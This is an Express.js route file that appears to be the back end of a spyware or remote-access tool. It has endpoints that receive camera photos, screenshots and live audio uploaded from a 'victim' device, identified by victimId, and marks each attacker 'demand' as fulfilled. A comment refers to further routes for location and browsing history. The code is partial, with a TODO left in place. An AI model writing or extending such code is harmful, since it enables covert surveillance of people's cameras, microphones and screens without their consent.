import { Router } from "express";
import Request from '../models/requestModel.js';
import multer from 'multer';

const router = Router();
const upload = multer({ dest: 'uploads/' });

/**
 * Handle camera picture upload
 * @route POST /api/fulfill/cameraPicture/:victimId
 */
router.post('/cameraPicture/:victimId', upload.single('img'), async (req, res, next) => {
    try {
        const updatedRequest = await Request.findOneAndUpdate(
            { victimId: req.params.victimId, demand: 'cameraPicture' },
            { fulfilled: true, fulfilledAt: req.file.destination },
            { new: true }
        );
        res.json(updatedRequest);
    } catch (err) {
        next(err);
    }
});

// Similar routes for screenshot, liveAudio, location, and history...

router.post('/screenshot/:victimId', upload.single('img'), async (req, res, next) => {
    try {
        const updatedRequest = await Request.findOneAndUpdate(
            { victimId: req.params.victimId, demand: 'screenshot' },
            { fulfilled: true, fulfilledAt: req.file.destination },
            { new: true }
        );
        res.json(updatedRequest);
    } catch (err) {
        next(err);
    }
});

router.post('/liveAudio/:victimId', upload.single('audio'), async (req, res, next) => {
    try {
        const updatedRequest = await Request.findOneAndUpdate(
            { victimId: req.params.victimId, demand: 'liveAudio' },
            { fulfilled: true, fulfilledAt: req.file.destination },
            { new: true }
        );
        res.json(updatedRequest);
    } catch (err) {
        next(err);
    }
})

//TODO


/**
 * Health check for fulfillment route
 * @route GET /api/fulfill/health
 */
router.get('/health', (req, res) => {
    res.send('Fulfillment route OK');
});

export default router;

